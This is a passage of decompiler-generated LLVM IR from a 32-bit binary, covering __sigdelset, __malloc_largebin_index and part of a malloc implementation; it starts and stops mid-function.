  %v2_804a3e1 = mul nuw nsw i32 %v2_804a3de, 4
  %v3_804a3e1 = add i32 %v2_804a3e1, %arg1
  %v4_804a3e1 = inttoptr i32 %v3_804a3e1 to i32*
  %v5_804a3e1 = load i32, i32* %v4_804a3e1, align 4
  %v7_804a3e1 = or i32 %v5_804a3e1, %v6_804a3e1
  store i32 %v7_804a3e1, i32* %v4_804a3e1, align 4
  %v2_804a3e6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a3e6, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804a3de, { 1, 0 }
  uselistorder i32 %v1_804a3d9, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804a3f6 = add i32 %arg2, -1
  %v1_804a3f9 = urem i32 %v1_804a3f6, 32
  %v2_804a3f9 = icmp eq i32 %v1_804a3f9, 0
  br i1 %v2_804a3f9, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_804a3fc = shl i32 -2, %v1_804a3f9
  %v5_804a3fc = sub nsw i32 32, %v1_804a3f9
  %v6_804a3fc = lshr i32 -2, %v5_804a3fc
  %v7_804a3fc = or i32 %v6_804a3fc, %v4_804a3fc
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804a401 = phi i32 [ -2, %entry ], [ %v7_804a3fc, %bb ]
  %v2_804a3fe = udiv i32 %v1_804a3f6, 32
  %v2_804a401 = mul nuw nsw i32 %v2_804a3fe, 4
  %v3_804a401 = add i32 %v2_804a401, %arg1
  %v4_804a401 = inttoptr i32 %v3_804a401 to i32*
  %v5_804a401 = load i32, i32* %v4_804a401, align 4
  %v7_804a401 = and i32 %v5_804a401, %v6_804a401
  store i32 %v7_804a401, i32* %v4_804a401, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804a3f9, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804a408 = load i32, i32* @eax, align 4
  %v6_804a41b = icmp ugt i32 %v0_804a408, 16777215
  br i1 %v6_804a41b, label %dec_label_pc_804a42c, label %dec_label_pc_804a41d

dec_label_pc_804a41d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804a408, 256
  %v2_804a40a = udiv i32 %v0_804a408, 256
  %v2_804a41d = call i32 @llvm.ctlz.i32(i32 %v2_804a40a, i1 true)
  %v3_804a41d = xor i32 %v2_804a41d, 31
  %v5_804a41d = select i1 %tmp, i32 95, i32 %v3_804a41d
  %v1_804a420 = add nuw nsw i32 %v5_804a41d, 6
  store i32 %v1_804a420, i32* @ecx, align 4
  %v2_804a423 = urem i32 %v1_804a420, 32
  %v4_804a423 = icmp eq i32 %v2_804a423, 0
  br i1 %v4_804a423, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804a41d
  %v5_804a423 = lshr i32 %v0_804a408, %v2_804a423
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804a41d, %bb
  %v0_804a425 = phi i32 [ %v0_804a408, %dec_label_pc_804a41d ], [ %v5_804a423, %bb ]
  %v1_804a425 = urem i32 %v0_804a425, 4
  %v2_804a428 = mul nuw nsw i32 %v5_804a41d, 4
  %v3_804a428 = or i32 %v1_804a425, 32
  %v4_804a428 = add nuw nsw i32 %v3_804a428, %v2_804a428
  br label %dec_label_pc_804a42c

dec_label_pc_804a42c:                             ; preds = %entry, %bb4
  %v0_804a42d = phi i32 [ 95, %entry ], [ %v4_804a428, %bb4 ]
  ret i32 %v0_804a42d

; uselistorder directives
  uselistorder i32 %v2_804a423, { 1, 0 }
  uselistorder i32 %v0_804a408, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804a42c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a42e = load i32, i32* @ebp, align 4
  %v0_804a42f = load i32, i32* @edi, align 4
  %v0_804a430 = load i32, i32* @esi, align 4
  %v0_804a431 = load i32, i32* @ebx, align 4
  store i32 %v0_804a431, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804a443 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a443, i32* @eax, align 4
  store i32 %v2_804a443, i32* %stack_var_-92, align 4
  %v2_804a448 = call i32 @__pthread_return_void(i32 %v2_804a443, i32 134526871)
  store i32 %v2_804a448, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052044.36 to i32), i32* %stack_var_-92, align 4
  %v1_804a454 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  store i32 %v1_804a454, i32* %eax.global-to-local, align 4
  %v0_804a45c = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804a45c, -32
  br i1 %tmp, label %dec_label_pc_804a473, label %dec_label_pc_804a461

dec_label_pc_804a461:                             ; preds = %entry
  %v0_804a461 = load i32, i32* %stack_var_-92, align 4
  %v1_804a461 = call i32 @__errno_location(i32 %v0_804a461)
  store i32 %v1_804a461, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804a468 = inttoptr i32 %v1_804a461 to i32*
  store i32 12, i32* %v1_804a468, align 4
  br label %dec_label_pc_804abc6

dec_label_pc_804a473:                             ; preds = %entry
  %v1_804a473 = add i32 %v0_804a45c, 11
  %tmp128 = icmp ult i32 %v1_804a473, 16
  br i1 %tmp128, label %dec_label_pc_804a48a, label %dec_label_pc_804a483

dec_label_pc_804a483:                             ; preds = %dec_label_pc_804a473
  %v1_804a483 = and i32 %v1_804a473, -8
  br label %dec_label_pc_804a48a

dec_label_pc_804a48a:                             ; preds = %dec_label_pc_804a473, %dec_label_pc_804a483
  %storemerge125 = phi i32 [ %v1_804a483, %dec_label_pc_804a483 ], [ %v1_804a473, %dec_label_pc_804a473 ]
  %v1_804a82a = phi i32 [ %v1_804a483, %dec_label_pc_804a483 ], [ 16, %dec_label_pc_804a473 ]
  store i32 %storemerge125, i32* %eax.global-to-local, align 4
  %v0_804a48a = load i8, i8* @global_var_8054600.37, align 1
  %v1_804a48a = sext i8 %v0_804a48a to i32
  store i32 %v1_804a48a, i32* @ebx, align 4
  %v3_804a490 = urem i8 %v0_804a48a, 2
  %v4_804a490 = icmp eq i8 %v3_804a490, 0
  %v1_804a493 = icmp eq i1 %v4_804a490, false
  br i1 %v1_804a493, label %dec_label_pc_804a4b2, label %dec_label_pc_804a495

dec_label_pc_804a495:                             ; preds = %dec_label_pc_804a48a
  %v2_804a495 = icmp eq i8 %v0_804a48a, 0
  %v1_804a497 = icmp eq i1 %v2_804a495, false
  br i1 %v1_804a497, label %dec_label_pc_804a795, label %dec_label_pc_804a49d

dec_label_pc_804a49d:                             ; preds = %dec_label_pc_804a495
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a4a5 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a4a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a795

dec_label_pc_804a4b2:                             ; preds = %dec_label_pc_804a48a
  %v11_804a4b2 = trunc i32 %v1_804a82a to i8
  %v8_804a4b6 = icmp ugt i8 %v11_804a4b2, %v0_804a48a
  br i1 %v8_804a4b6, label %dec_label_pc_804a4d3, label %dec_label_pc_804a4b8

dec_label_pc_804a4b8:                             ; preds = %dec_label_pc_804a4b2
  %v2_804a4bc = udiv i32 %v1_804a82a, 2
  store i32 %v2_804a4bc, i32* %eax.global-to-local, align 4
  %v1_804a4be = add i32 %v2_804a4bc, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v1_804a4be, i32* @ecx, align 4
  %v1_804a4c4 = add i32 %v2_804a4bc, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804a4c4 = inttoptr i32 %v1_804a4c4 to i32*
  %v3_804a4c4 = load i32, i32* %v2_804a4c4, align 4
  store i32 %v3_804a4c4, i32* @edx, align 4
  %v1_804a4c7 = icmp eq i32 %v3_804a4c4, 0
  br i1 %v1_804a4c7, label %dec_label_pc_804a4d3, label %dec_label_pc_804a4cb

dec_label_pc_804a4cb:                             ; preds = %dec_label_pc_804a4b8
  %v1_804a4cb = add i32 %v3_804a4c4, 8
  %v2_804a4cb = inttoptr i32 %v1_804a4cb to i32*
  %v3_804a4cb = load i32, i32* %v2_804a4cb, align 4
  store i32 %v3_804a4cb, i32* %eax.global-to-local, align 4
  store i32 %v3_804a4cb, i32* %v2_804a4c4, align 4
  br label %dec_label_pc_804a50c

dec_label_pc_804a4d3:                             ; preds = %dec_label_pc_804a4b8, %dec_label_pc_804a4b2
  %v8_804a4d3 = icmp ult i32 %v1_804a82a, 255
  %v6_804a4db = icmp ugt i32 %v1_804a82a, 255
  store i32 %v1_804a82a, i32* @eax, align 4
  br i1 %v6_804a4db, label %dec_label_pc_804a514, label %dec_label_pc_804a4dd

dec_label_pc_804a4dd:                             ; preds = %dec_label_pc_804a4d3
  %v2_804a4e1 = udiv i32 %v1_804a82a, 8
  store i32 %v2_804a4e1, i32* %eax.global-to-local, align 4
  %v1_804a4e4 = mul nuw i32 %v2_804a4e1, 8
  %v2_804a4e4 = add i32 %v1_804a4e4, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a4e4, i32* @ecx, align 4
  %v1_804a4ef = add i32 %v1_804a4e4, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a4ef = inttoptr i32 %v1_804a4ef to i32*
  %v3_804a4ef = load i32, i32* %v2_804a4ef, align 4
  store i32 %v3_804a4ef, i32* @edx, align 4
  %v12_804a4f2 = icmp eq i32 %v3_804a4ef, %v2_804a4e4
  br i1 %v12_804a4f2, label %dec_label_pc_804a610.preheader, label %dec_label_pc_804a4fa

dec_label_pc_804a4fa:                             ; preds = %dec_label_pc_804a4dd
  store i32 %v1_804a82a, i32* %ebx.global-to-local, align 4
  %v1_804a4fe = add i32 %v3_804a4ef, 12
  %v2_804a4fe = inttoptr i32 %v1_804a4fe to i32*
  %v3_804a4fe = load i32, i32* %v2_804a4fe, align 4
  store i32 %v3_804a4fe, i32* %eax.global-to-local, align 4
  %v2_804a501 = or i32 %v1_804a82a, 4
  %v3_804a501 = add i32 %v3_804a4ef, %v2_804a501
  %v4_804a501 = inttoptr i32 %v3_804a501 to i32*
  %v5_804a501 = load i32, i32* %v4_804a501, align 4
  %v6_804a501 = or i32 %v5_804a501, 1
  store i32 %v6_804a501, i32* %v4_804a501, align 4
  %v0_804a506 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a506 = load i32, i32* @ecx, align 4
  %v2_804a506 = add i32 %v1_804a506, 12
  %v3_804a506 = inttoptr i32 %v2_804a506 to i32*
  store i32 %v0_804a506, i32* %v3_804a506, align 4
  %v0_804a509 = load i32, i32* @ecx, align 4
  %v1_804a509 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a509 = add i32 %v1_804a509, 8
  %v3_804a509 = inttoptr i32 %v2_804a509 to i32*
  store i32 %v0_804a509, i32* %v3_804a509, align 4
  br label %dec_label_pc_804a50c

dec_label_pc_804a50c:                             ; preds = %dec_label_pc_804a4cb, %dec_label_pc_804a4fa
  %v0_804a50c = load i32, i32* @edx, align 4
  %v1_804a50c = add i32 %v0_804a50c, 8
  store i32 %v1_804a50c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804a514:                             ; preds = %dec_label_pc_804a4d3
  %v0_804a518 = call i32 @__malloc_largebin_index()
  store i32 %v0_804a518, i32* %eax.global-to-local, align 4
  %v3_804a51d = and i8 %v0_804a48a, 2
  %v4_804a51d = icmp eq i8 %v3_804a51d, 0
  br i1 %v4_804a51d, label %dec_label_pc_804a610.preheader, label %dec_label_pc_804a52a

dec_label_pc_804a52a:                             ; preds = %dec_label_pc_804a514
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a532 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a532, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a610.preheader

dec_label_pc_804a610.preheader:                   ; preds = %dec_label_pc_804a52a, %dec_label_pc_804a4dd, %dec_label_pc_804a514
  %stack_var_-40.0.ph = phi i32 [ %v2_804a4e1, %dec_label_pc_804a4dd ], [ %v0_804a518, %dec_label_pc_804a52a ], [ %v0_804a518, %dec_label_pc_804a514 ]
  %v1_804a566 = add i32 %v1_804a82a, 16
  %v0_804a610107 = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a610107, i32* @ebp, align 4
  %v9_804a616110 = icmp eq i32 %v0_804a610107, 134563380
  %v1_804a61c112 = icmp eq i1 %v9_804a616110, false
  br i1 %v1_804a61c112, label %dec_label_pc_804a53f, label %dec_label_pc_804a622

dec_label_pc_804a53f:                             ; preds = %dec_label_pc_804a610.preheader, %bb82
  %v0_804a610113 = phi i32 [ %v0_804a610, %bb82 ], [ %v0_804a610107, %dec_label_pc_804a610.preheader ]
  %v1_804a53f = add i32 %v0_804a610113, 4
  %v2_804a53f = inttoptr i32 %v1_804a53f to i32*
  %v3_804a53f = load i32, i32* %v2_804a53f, align 4
  %v1_804a542 = add i32 %v0_804a610113, 12
  %v2_804a542 = inttoptr i32 %v1_804a542 to i32*
  %v3_804a542 = load i32, i32* %v2_804a542, align 4
  store i32 %v3_804a542, i32* @edx, align 4
  %v1_804a545 = and i32 %v3_804a53f, -4
  store i32 %v1_804a545, i32* @edi, align 4
  br i1 %v6_804a4db, label %dec_label_pc_804a571, label %dec_label_pc_804a552

dec_label_pc_804a552:                             ; preds = %dec_label_pc_804a53f
  %v9_804a552 = icmp eq i32 %v3_804a542, 134563380
  %v1_804a558 = icmp eq i1 %v9_804a552, false
  br i1 %v1_804a558, label %dec_label_pc_804a571, label %dec_label_pc_804a55a

dec_label_pc_804a55a:                             ; preds = %dec_label_pc_804a552
  %v1_804a55a = load i32, i32* @global_var_8054630.39, align 16
  %v12_804a55a = icmp eq i32 %v0_804a610113, %v1_804a55a
  %v1_804a560 = icmp eq i1 %v12_804a55a, false
  br i1 %v1_804a560, label %dec_label_pc_804a571, label %dec_label_pc_804a562

dec_label_pc_804a562:                             ; preds = %dec_label_pc_804a55a
  store i32 %v1_804a566, i32* %eax.global-to-local, align 4
  %v6_804a56b = icmp ugt i32 %v1_804a545, %v1_804a566
  br i1 %v6_804a56b, label %dec_label_pc_804ab50, label %dec_label_pc_804a571

dec_label_pc_804a571:                             ; preds = %dec_label_pc_804a562, %dec_label_pc_804a55a, %dec_label_pc_804a552, %dec_label_pc_804a53f
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804a542, i32* @global_var_8054640.41, align 4
  %v2_804a579 = add i32 %v3_804a542, 8
  %v3_804a579 = inttoptr i32 %v2_804a579 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v3_804a579, align 4
  %v0_804a57c = load i32, i32* @edi, align 4
  %v15_804a57c = icmp eq i32 %v0_804a57c, %v1_804a82a
  br i1 %v15_804a57c, label %dec_label_pc_804ab91, label %dec_label_pc_804a586

dec_label_pc_804a586:                             ; preds = %dec_label_pc_804a571
  %v6_804a58c = icmp ugt i32 %v0_804a57c, 255
  br i1 %v6_804a58c, label %dec_label_pc_804a59f, label %dec_label_pc_804a58e

dec_label_pc_804a58e:                             ; preds = %dec_label_pc_804a586
  %v2_804a590 = udiv i32 %v0_804a57c, 8
  store i32 %v2_804a590, i32* %esi.global-to-local, align 4
  %v1_804a593 = mul nuw i32 %v2_804a590, 8
  %v2_804a593 = add i32 %v1_804a593, 134563372
  store i32 %v2_804a593, i32* @ebx, align 4
  %v1_804a59a = add i32 %v1_804a593, 134563380
  %v2_804a59a = inttoptr i32 %v1_804a59a to i32*
  %v3_804a59a = load i32, i32* %v2_804a59a, align 4
  store i32 %v3_804a59a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a5e8

dec_label_pc_804a59f:                             ; preds = %dec_label_pc_804a586
  store i32 %v0_804a57c, i32* @eax, align 4
  %v0_804a5a1 = call i32 @__malloc_largebin_index()
  store i32 %v0_804a5a1, i32* %esi.global-to-local, align 4
  %v1_804a5a8 = mul i32 %v0_804a5a1, 8
  %v2_804a5a8 = add i32 %v1_804a5a8, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a5a8, i32* %eax.global-to-local, align 4
  %v1_804a5af = add i32 %v1_804a5a8, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 8)
  %v2_804a5af = inttoptr i32 %v1_804a5af to i32*
  %v3_804a5af = load i32, i32* %v2_804a5af, align 4
  store i32 %v3_804a5af, i32* %edx.global-to-local, align 4
  %v12_804a5b2 = icmp eq i32 %v3_804a5af, %v2_804a5a8
  store i32 %v3_804a5af, i32* @ebx, align 4
  br i1 %v12_804a5b2, label %dec_label_pc_804a5e8, label %dec_label_pc_804a5bc

dec_label_pc_804a5bc:                             ; preds = %dec_label_pc_804a59f
  %v1_804a5bc = add i32 %v1_804a5a8, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a5bc = inttoptr i32 %v1_804a5bc to i32*
  %v3_804a5bc = load i32, i32* %v2_804a5bc, align 4
  store i32 %v3_804a5bc, i32* @ebx, align 4
  %v0_804a5bf = load i32, i32* @edi, align 4
  %v2_804a5bf = add i32 %v3_804a5bc, 4
  %v3_804a5bf = inttoptr i32 %v2_804a5bf to i32*
  %v4_804a5bf = load i32, i32* %v3_804a5bf, align 4
  %v10_804a5bf = icmp ult i32 %v0_804a5bf, %v4_804a5bf
  %v1_804a5c2 = icmp eq i1 %v10_804a5bf, false
  br i1 %v1_804a5c2, label %dec_label_pc_804a5ca, label %dec_label_pc_804a5e8

dec_label_pc_804a5ca:                             ; preds = %dec_label_pc_804a5bc
  %v1_804a5cc = or i32 %v0_804a5bf, 1
  store i32 %v1_804a5cc, i32* %eax.global-to-local, align 4
  store i32 %v3_804a5af, i32* %ebx.global-to-local, align 4
  %v2_804a5e0100 = add i32 %v3_804a5af, 4
  %v3_804a5e0101 = inttoptr i32 %v2_804a5e0100 to i32*
  %v4_804a5e0102 = load i32, i32* %v3_804a5e0101, align 4
  %v10_804a5e0104 = icmp ult i32 %v1_804a5cc, %v4_804a5e0102
  br i1 %v10_804a5e0104, label %dec_label_pc_804a5d1, label %dec_label_pc_804a5e5

dec_label_pc_804a5d1:                             ; preds = %dec_label_pc_804a5ca, %dec_label_pc_804a5d1
  %v0_804a5e5105 = phi i32 [ %v3_804a5d5, %dec_label_pc_804a5d1 ], [ %v3_804a5af, %dec_label_pc_804a5ca ]
  store i32 %v0_804a5e5105, i32* %ecx.global-to-local, align 4
  %v1_804a5d5 = add i32 %v0_804a5e5105, 8
  %v2_804a5d5 = inttoptr i32 %v1_804a5d5 to i32*
  %v3_804a5d5 = load i32, i32* %v2_804a5d5, align 4
  store i32 %v3_804a5d5, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a5d5, i32* %ebx.global-to-local, align 4
  %v2_804a5e0 = add i32 %v3_804a5d5, 4
  %v3_804a5e0 = inttoptr i32 %v2_804a5e0 to i32*
  %v4_804a5e0 = load i32, i32* %v3_804a5e0, align 4
  %v10_804a5e0 = icmp ult i32 %v1_804a5cc, %v4_804a5e0
  br i1 %v10_804a5e0, label %dec_label_pc_804a5d1, label %dec_label_pc_804a5e5

dec_label_pc_804a5e5:                             ; preds = %dec_label_pc_804a5d1, %dec_label_pc_804a5ca
  %v0_804a5e5.lcssa = phi i32 [ %v3_804a5af, %dec_label_pc_804a5ca ], [ %v3_804a5d5, %dec_label_pc_804a5d1 ]
  %v1_804a5e5 = add i32 %v0_804a5e5.lcssa, 12
  %v2_804a5e5 = inttoptr i32 %v1_804a5e5 to i32*
  %v3_804a5e5 = load i32, i32* %v2_804a5e5, align 4
  store i32 %v3_804a5e5, i32* @ebx, align 4
  br label %dec_label_pc_804a5e8

dec_label_pc_804a5e8:                             ; preds = %dec_label_pc_804a58e, %dec_label_pc_804a5bc, %dec_label_pc_804a59f, %dec_label_pc_804a5e5
  %v0_804a5e8 = phi i32 [ %v0_804a5a1, %dec_label_pc_804a59f ], [ %v0_804a5a1, %dec_label_pc_804a5e5 ], [ %v0_804a5a1, %dec_label_pc_804a5bc ], [ %v2_804a590, %dec_label_pc_804a58e ]
  %stack_var_-64.1 = phi i32 [ %v3_804a5af, %dec_label_pc_804a59f ], [ %v0_804a5e5.lcssa, %dec_label_pc_804a5e5 ], [ %v2_804a5a8, %dec_label_pc_804a5bc ], [ %v3_804a59a, %dec_label_pc_804a58e ]
  %v1_804a5ea = urem i32 %v0_804a5e8, 32
  %v2_804a5ea = icmp eq i32 %v1_804a5ea, 0
  store i32 %v1_804a5ea, i32* %esi.global-to-local, align 4
  store i32 %v1_804a5ea, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a5f4 = sdiv i32 %v0_804a5e8, 32
  store i32 %v2_804a5f4, i32* %edx.global-to-local, align 4
  br i1 %v2_804a5ea, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_804a5e8
  %v5_804a5f7 = shl i32 1, %v1_804a5ea
  store i32 %v5_804a5f7, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_804a5e8, %bb
  %v5_804a5f9 = phi i32 [ 1, %dec_label_pc_804a5e8 ], [ %v5_804a5f7, %bb ]
  %v1_804a5f9 = mul nsw i32 %v2_804a5f4, 4
  %v2_804a5f9 = add i32 %v1_804a5f9, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a5f9 = inttoptr i32 %v2_804a5f9 to i32*
  %v4_804a5f9 = load i32, i32* %v3_804a5f9, align 4
  %v6_804a5f9 = or i32 %v4_804a5f9, %v5_804a5f9
  store i32 %v6_804a5f9, i32* %v3_804a5f9, align 4
  %v0_804a600 = load i32, i32* @ebx, align 4
  %v1_804a600 = load i32, i32* @ebp, align 4
  %v2_804a600 = add i32 %v1_804a600, 12
  %v3_804a600 = inttoptr i32 %v2_804a600 to i32*
  store i32 %v0_804a600, i32* %v3_804a600, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804a607 = load i32, i32* @ebp, align 4
  %v2_804a607 = add i32 %v1_804a607, 8
  %v3_804a607 = inttoptr i32 %v2_804a607 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804a607, align 4
  %v0_804a60a = load i32, i32* @ebp, align 4
  %v1_804a60a = load i32, i32* @esi, align 4
  %v2_804a60a = add i32 %v1_804a60a, 12
  %v3_804a60a = inttoptr i32 %v2_804a60a to i32*
  store i32 %v0_804a60a, i32* %v3_804a60a, align 4
  %v0_804a60d = load i32, i32* @ebp, align 4
  %v1_804a60d = load i32, i32* @ebx, align 4
  %v2_804a60d = add i32 %v1_804a60d, 8
  %v3_804a60d = inttoptr i32 %v2_804a60d to i32*
  store i32 %v0_804a60d, i32* %v3_804a60d, align 4
  %v0_804a610 = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a610, i32* @ebp, align 4
  %v9_804a616 = icmp eq i32 %v0_804a610, 134563380
  %v1_804a61c = icmp eq i1 %v9_804a616, false
  br i1 %v1_804a61c, label %dec_label_pc_804a53f, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %bb82, %dec_label_pc_804a610.preheader
  br i1 %v8_804a4d3, label %dec_label_pc_804a6b0, label %dec_label_pc_804a630

dec_label_pc_804a630:                             ; preds = %dec_label_pc_804a622
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804a634 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804a634 = add i32 %v1_804a634, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a634, i32* %edx.global-to-local, align 4
  %v1_804a63b = add i32 %v1_804a634, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a63b = inttoptr i32 %v1_804a63b to i32*
  %storemerge1.pre = load i32, i32* %v2_804a63b, align 4
  br label %dec_label_pc_804a6ac

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a6ac
  %v1_804a640 = add i32 %v4_804a657, 4
  %v2_804a640 = inttoptr i32 %v1_804a640 to i32*
  %v3_804a640 = load i32, i32* %v2_804a640, align 4
  store i32 %v3_804a640, i32* %ebx.global-to-local, align 4
  %v1_804a643 = add i32 %v4_804a657, 12
  %v2_804a643 = inttoptr i32 %v1_804a643 to i32*
  %v3_804a643 = load i32, i32* %v2_804a643, align 4
  store i32 %v3_804a643, i32* @ecx, align 4
  %v1_804a646 = and i32 %v3_804a640, -4
  store i32 %v1_804a646, i32* @ebx, align 4
  %v10_804a649 = icmp ult i32 %v1_804a646, %v1_804a82a
  br i1 %v10_804a649, label %dec_label_pc_804a6ac, label %dec_label_pc_804a64f

dec_label_pc_804a64f:                             ; preds = %dec_label_pc_804a640
  %v1_804a64f = add i32 %v4_804a657, 8
  %v2_804a64f = inttoptr i32 %v1_804a64f to i32*
  %v3_804a64f = load i32, i32* %v2_804a64f, align 4
  store i32 %v3_804a64f, i32* @edx, align 4
  %v1_804a652 = add i32 %v3_804a64f, 12
  %v2_804a652 = inttoptr i32 %v1_804a652 to i32*
  %v3_804a652 = load i32, i32* %v2_804a652, align 4
  %v15_804a652 = icmp eq i32 %v3_804a652, %v4_804a657
  %v1_804a655 = icmp eq i1 %v15_804a652, false
  br i1 %v1_804a655, label %dec_label_pc_804a65c, label %dec_label_pc_804a657

dec_label_pc_804a657:                             ; preds = %dec_label_pc_804a64f
  %v1_804a657 = add i32 %v3_804a643, 8
  %v2_804a657 = inttoptr i32 %v1_804a657 to i32*
  %v3_804a657 = load i32, i32* %v2_804a657, align 4
  %v15_804a657 = icmp eq i32 %v3_804a657, %v4_804a657
  br i1 %v15_804a657, label %dec_label_pc_804a661, label %dec_label_pc_804a65c

dec_label_pc_804a65c:                             ; preds = %dec_label_pc_804a657, %dec_label_pc_804a64f
  %v0_804a65c = call i32 @abort()
  store i32 %v0_804a65c, i32* %eax.global-to-local, align 4
  %v0_804a661.pre = load i32, i32* @ebx, align 4
  %v0_804a667.pre = load i32, i32* @ecx, align 4
  %v1_804a667.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a661

dec_label_pc_804a661:                             ; preds = %dec_label_pc_804a657, %dec_label_pc_804a65c
  %v1_804a667 = phi i32 [ %v3_804a64f, %dec_label_pc_804a657 ], [ %v1_804a667.pre, %dec_label_pc_804a65c ]
  %v0_804a667 = phi i32 [ %v3_804a643, %dec_label_pc_804a657 ], [ %v0_804a667.pre, %dec_label_pc_804a65c ]
  %v0_804a661 = phi i32 [ %v1_804a646, %dec_label_pc_804a657 ], [ %v0_804a661.pre, %dec_label_pc_804a65c ]
  %v5_804a663 = sub i32 %v0_804a661, %v1_804a82a
  store i32 %v5_804a663, i32* %esi.global-to-local, align 4
  %v2_804a667 = add i32 %v1_804a667, 12
  %v3_804a667 = inttoptr i32 %v2_804a667 to i32*
  store i32 %v0_804a667, i32* %v3_804a667, align 4
  %v0_804a66a = load i32, i32* @edx, align 4
  %v1_804a66a = load i32, i32* @ecx, align 4
  %v2_804a66a = add i32 %v1_804a66a, 8
  %v3_804a66a = inttoptr i32 %v2_804a66a to i32*
  store i32 %v0_804a66a, i32* %v3_804a66a, align 4
  %v0_804a66d = load i32, i32* %eax.global-to-local, align 4
  %v1_804a66d = add i32 %v0_804a66d, 8
  store i32 %v1_804a66d, i32* @ecx, align 4
  %v0_804a670 = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_804a670, 16
  br i1 %tmp129, label %dec_label_pc_804ab9f, label %dec_label_pc_804a679

dec_label_pc_804a679:                             ; preds = %dec_label_pc_804a661
  %v2_804a67d = add i32 %v0_804a66d, %v1_804a82a
  store i32 %v2_804a67d, i32* @edx, align 4
  %v1_804a680 = or i32 %v1_804a82a, 1
  store i32 %v1_804a680, i32* %ebx.global-to-local, align 4
  %v2_804a683 = add i32 %v0_804a66d, 4
  %v3_804a683 = inttoptr i32 %v2_804a683 to i32*
  store i32 %v1_804a680, i32* %v3_804a683, align 4
  %v0_804a686 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a688 = or i32 %v0_804a686, 1
  store i32 %v1_804a688, i32* %eax.global-to-local, align 4
  %v0_804a68b = load i32, i32* @edx, align 4
  %v1_804a68b = load i32, i32* @ebp, align 4
  %v2_804a68b = add i32 %v1_804a68b, 8
  %v3_804a68b = inttoptr i32 %v2_804a68b to i32*
  store i32 %v0_804a68b, i32* %v3_804a68b, align 4
  %v0_804a68e = load i32, i32* @edx, align 4
  %v1_804a68e = load i32, i32* @ebp, align 4
  %v2_804a68e = add i32 %v1_804a68e, 12
  %v3_804a68e = inttoptr i32 %v2_804a68e to i32*
  store i32 %v0_804a68e, i32* %v3_804a68e, align 4
  %v0_804a691 = load i32, i32* @edx, align 4
  %v1_804a691 = add i32 %v0_804a691, 8
